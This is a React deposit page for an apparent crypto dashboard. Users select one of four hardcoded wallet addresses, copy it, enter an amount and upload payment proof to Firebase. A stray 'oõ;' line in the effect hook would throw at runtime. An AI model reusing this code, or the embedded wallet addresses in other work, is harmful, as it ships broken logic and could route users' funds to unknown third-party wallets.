import React, { useState, useRef, useEffect } from "react";
import Container from "../../components/Container";
import { ReactComponent as WarningImg } from "../../resources/images/dashboard/trans/warning.svg";
import SelectInput from "../../components/vendor/form/SelectInput";
import TextInput from "../../components/vendor/form/TextInput";
import FileInput from "../../components/vendor/form/FileInput";
import SubmitButton from "../../components/vendor/button/SubmitButton";
import { FontAwesomeIcon } from "@fortawesome/react-fontawesome";
import { faCopy } from "@fortawesome/free-solid-svg-icons";
import {
  addToCollectionArray,
  getUpdatedDocument,
} from "../../firebase/firestore";
import Alert from "../../components/vendor/alert/Alert";
import DataTable from "./comp/DataTable";
import { general } from "../../utility/general";

export default function Deposit() {
  const [formData, setFormData] = useState({
    wallet: "",
    amount: "",
    file: [],
    status: false,
  });
  const refInput = useRef(null);
  const [deposit, setDepsoit] = useState({ regions: [] });
  const wallet = useRef(null);
  const [loading, setLoading] = useState(false);
  const [check, setCheck] = useState(true);
  function handleChange(e) {
    const { name, value } = e.target;
    if (name === "wallet") {
      wallet.current = value;
    }
    setFormData((prevFormData) => ({
      ...prevFormData,
      [name]: value,
    }));
  }

  const [result, setResult] = useState({
    status: 0,
    message: null,
  });

  useEffect(() => {
    if (!check) {
      return;
    }

    // Callback function to handle updates
    const handleUpdate = (data) => {
      setDepsoit(data);
    };

    console.log("here");
    oõ;
    // Start listening for updates
    const unsubscribe = getUpdatedDocument("deposits", handleUpdate);

    // Clean up the listener on component unmount
    return () => {
      unsubscribe();
      setTimeout(() => {
        setCheck(false);
      }, 1000);
    };
  }, [deposit, check]);

  const categoryOptions = [
    {
      content: "Etherum ERC20",
      value: "0x3ab73CB5Ebe9Dd092E7Ee43eF9778fC0e8A29e91",
    },
    {
      content: "Bitcoin BTC",
      value: "34hfes2BmfdnXP74BUZCMnnHfXWPhyYnXz",
    },
    {
      content: "USDT TRC20",
      value: "TPwUeQBX4F74KQ42P1ko2bhqdtMcg8KuT1",
    },
    {
      content: "BNB",
      value: "0x81a92f6A577dfd88a055951489eC59Ae5253DD6A",
    },
  ];

  const handleFileChange = () => {
    // create data transfer
    const dt = new DataTransfer();

    // define max size in bytes
    const maxSize = 10000000;

    // ensure refInput is not null
    if (refInput.current && refInput.current.files) {
      // add eligible files to data transfer
      for (const file of refInput.current.files) {
        if (file.size <= maxSize) {
          dt.items.add(file);
          console.log(dt.files);
        } else {
          console.log("not");
          return setResult({
            status: 500,
            message: "File size exceeds limit",
          });
        }
      }
      setFormData((prevFormData) => ({
        ...prevFormData,
        file: dt.files,
      }));
    } else {
      console.error("File input is not available.");
    }
  };

  const copyToClipboard = () => {
    navigator.clipboard
      .writeText(wallet.current)
      .then(() => {
        alert("Address has been copied to clipboard");
      })
      .catch((error) => {
        return setResult({
          status: 0,
          message: `Failed to copy text: ${error}`,
        });
      });
  };

  async function handleSubmit(e) {
    e.preventDefault();
    setLoading(true);
    const result = await addToCollectionArray("deposits", formData);
    setResult(result);
    setCheck(true);
    setLoading(false);
  }

  return (
    <Container title="Deposit">
      <div className="flex items-center justify-center flex-col h-screen">
        <div className="flex items-center gap-3 w-4/5 m-6 bg-purple-600 mx-4 rounded-t-xl p-3">
          <WarningImg width={50} />
          <p>
            Please We only acceptes digital currency , {general.name} won't be
            liable for any loss of funds.
          </p>
        </div>
        <div className="w-4/5">
          <form
            onSubmit={handleSubmit}
            action=""
            className="flex flex-col items-center justify-center w-full"
          >
            <Alert result={result} setResult={setResult} timer={false} />
            <div className=" bg-slate-400 p-5">
              <h1 className="text-xl font-semibold p-2 ">
                DEPOSIT AND SUBMIT PROOF TO TOP UP YOUR BALANCE
              </h1>
              <div className="p-4 flex items-center">
                <span className="mr-2">{wallet.current}</span>
                <FontAwesomeIcon
                  icon={faCopy}
                  className="cursor-pointer text-blue-500"
                  onClick={copyToClipboard}
                />
              </div>
              <SelectInput
                handleChange={handleChange}
                placeholder={"Select Crypto Wallet"}
                name={"wallet"}
                value={formData.category}
                required={true}
                bg="gray"
                options={categoryOptions}
              />

              <TextInput
                handleChange={handleChange}
                placeholder={"Amount"}
                name={"amount"}
                value={formData.amount}
                type={"number"}
                required={true}
                bg="gray"
              />

              <FileInput
                handleChange={handleFileChange}
                placeholder={"Payment Proof"}
                name={"file"}
                value={formData.file}
                bg="gray"
                required={true}
                refInput={refInput}
              />

              <SubmitButton loading={loading} />
            </div>
          </form>
        </div>
        <div className="mb-5 pb-5 flex items-center w-4/5 justify-center">
          <DataTable data={deposit.regions.slice(1)} />
        </div>
      </div>
    </Container>
  );
}
